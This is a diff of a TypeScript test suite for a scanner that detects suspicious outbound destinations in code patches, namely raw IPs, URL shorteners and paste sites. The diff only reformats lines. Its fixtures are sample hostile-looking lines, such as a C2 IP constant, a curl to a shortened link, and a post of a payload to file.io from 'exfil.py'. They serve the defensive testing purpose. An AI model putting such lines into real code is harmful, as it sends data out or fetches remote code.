@@ -19,8 +19,13 @@ function makeRemovedPatch(line: string): string {
 describe("Outbound Destination Detection Rules (#2091)", () => {
   describe("SEC_OUTBOUND_RAW_IP – raw IP addresses", () => {
     it("flags a public IPv4 address in added code", () => {
-      const findings = scanFileWithOutboundRules("src/config.ts", makePatch('const C2 = "198.51.100.1";'));
-      const rawIp = findings.find((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS);
+      const findings = scanFileWithOutboundRules(
+        "src/config.ts",
+        makePatch('const C2 = "198.51.100.1";'),
+      );
+      const rawIp = findings.find(
+        (f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS,
+      );
       expect(rawIp).toBeDefined();
       expect(rawIp?.severity).toBe("MEDIUM");
       expect(rawIp?.description).toContain("198.51.100.1");
@@ -35,13 +40,18 @@ describe("Outbound Destination Detection Rules (#2091)", () => {
       ];
       for (const line of lines) {
         const findings = scanFileWithOutboundRules("src/net.ts", makePatch(line));
-        const rawIp = findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS);
+        const rawIp = findings.filter(
+          (f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS,
+        );
         expect(rawIp, `Expected no finding for '${line}'`).toHaveLength(0);
       }
     });
 
     it("does NOT flag IPs on removed lines", () => {
-      const findings = scanFileWithOutboundRules("src/net.ts", makeRemovedPatch('const c2 = "198.51.100.42";'));
+      const findings = scanFileWithOutboundRules(
+        "src/net.ts",
+        makeRemovedPatch('const c2 = "198.51.100.42";'),
+      );
       expect(findings).toHaveLength(0);
     });
 
@@ -51,41 +61,66 @@ describe("Outbound Destination Detection Rules (#2091)", () => {
         makePatch('const host = "1.2.3.4";'),
         { allowedHosts: ["1.2.3.4"] },
       );
-      expect(findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS)).toHaveLength(0);
+      expect(
+        findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS),
+      ).toHaveLength(0);
     });
   });
 
   describe("SEC_OUTBOUND_URL_SHORTENER – URL shorteners", () => {
     it("flags bit.ly URL", () => {
-      const findings = scanFileWithOutboundRules("src/app.js", makePatch('fetch("https://bit.ly/3xAbc12")'));
-      const shortener = findings.find((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER);
+      const findings = scanFileWithOutboundRules(
+        "src/app.js",
+        makePatch('fetch("https://bit.ly/3xAbc12")'),
+      );
+      const shortener = findings.find(
+        (f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER,
+      );
       expect(shortener).toBeDefined();
       expect(shortener?.severity).toBe("MEDIUM");
       expect(shortener?.description).toContain("bit.ly");
     });
 
     it("flags tinyurl.com URL", () => {
-      const findings = scanFileWithOutboundRules("scripts/run.sh", makePatch('curl https://tinyurl.com/abc123'));
-      expect(findings.some((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER)).toBe(true);
+      const findings = scanFileWithOutboundRules(
+        "scripts/run.sh",
+        makePatch("curl https://tinyurl.com/abc123"),
+      );
+      expect(
+        findings.some((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER),
+      ).toBe(true);
     });
 
     it("masks credentials in URL in description", () => {
-      const findings = scanFileWithOutboundRules("src/app.js", makePatch('fetch("https://user:pass@bit.ly/abc")'));
-      const shortener = findings.find((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER);
+      const findings = scanFileWithOutboundRules(
+        "src/app.js",
+        makePatch('fetch("https://user:pass@bit.ly/abc")'),
+      );
+      const shortener = findings.find(
+        (f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER,
+      );
       expect(shortener?.description).not.toContain("pass");
       expect(shortener?.description).toContain("***@");
     });
 
     it("does NOT flag normal HTTPS URLs to known domains", () => {
-      const findings = scanFileWithOutboundRules("src/api.ts", makePatch('fetch("https://api.github.com/repos")'));
-      const shorteners = findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER);
+      const findings = scanFileWithOutboundRules(
+        "src/api.ts",
+        makePatch('fetch("https://api.github.com/repos")'),
+      );
+      const shorteners = findings.filter(
+        (f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER,
+      );
       expect(shorteners).toHaveLength(0);
     });
   });
 
   describe("SEC_OUTBOUND_PASTE_SITE – paste / file-sharing sites", () => {
     it("flags pastebin.com URL", () => {
-      const findings = scanFileWithOutboundRules("src/bootstrap.py", makePatch('url = "https://pastebin.com/raw/abc123"'));
+      const findings = scanFileWithOutboundRules(
+        "src/bootstrap.py",
+        makePatch('url = "https://pastebin.com/raw/abc123"'),
+      );
       const paste = findings.find((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.PASTE_SITE);
       expect(paste).toBeDefined();
       expect(paste?.severity).toBe("MEDIUM");
@@ -93,12 +128,20 @@ describe("Outbound Destination Detection Rules (#2091)", () => {
     });
 
     it("flags file.io URL", () => {
-      const findings = scanFileWithOutboundRules("src/exfil.py", makePatch('requests.post("https://file.io", data=payload)'));
-      expect(findings.some((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.PASTE_SITE)).toBe(true);
+      const findings = scanFileWithOutboundRules(
+        "src/exfil.py",
+        makePatch('requests.post("https://file.io", data=payload)'),
+      );
+      expect(findings.some((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.PASTE_SITE)).toBe(
+        true,
+      );
     });
 
     it("does NOT flag paste sites on removed lines", () => {
-      const findings = scanFileWithOutboundRules("src/old.py", makeRemovedPatch('url = "https://pastebin.com/raw/xyz"'));
+      const findings = scanFileWithOutboundRules(
+        "src/old.py",
+        makeRemovedPatch('url = "https://pastebin.com/raw/xyz"'),
+      );
       expect(findings).toHaveLength(0);
     });
 
@@ -108,7 +151,9 @@ describe("Outbound Destination Detection Rules (#2091)", () => {
         makePatch('url = "https://pastebin.com/raw/abc"'),
         { allowedHosts: ["pastebin.com"] },
       );
-      expect(findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.PASTE_SITE)).toHaveLength(0);
+      expect(
+        findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.PASTE_SITE),
+      ).toHaveLength(0);
     });
   });
 
@@ -119,8 +164,12 @@ describe("Outbound Destination Detection Rules (#2091)", () => {
         makePatch('fetch("https://bit.ly/abc"); const ip = "198.51.100.1";'),
         { disabledRules: ["SEC_OUTBOUND_URL_SHORTENER"] },
       );
-      const shorteners = findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER);
-      const ips = findings.filter((f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS);
+      const shorteners = findings.filter(
+        (f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.URL_SHORTENER,
+      );
+      const ips = findings.filter(
+        (f) => f.matchedSignatures?.[0] === OUTBOUND_RULE_IDS.RAW_IP_ADDRESS,
+      );
       expect(shorteners).toHaveLength(0);
       expect(ips.length).toBeGreaterThanOrEqual(1);
     });
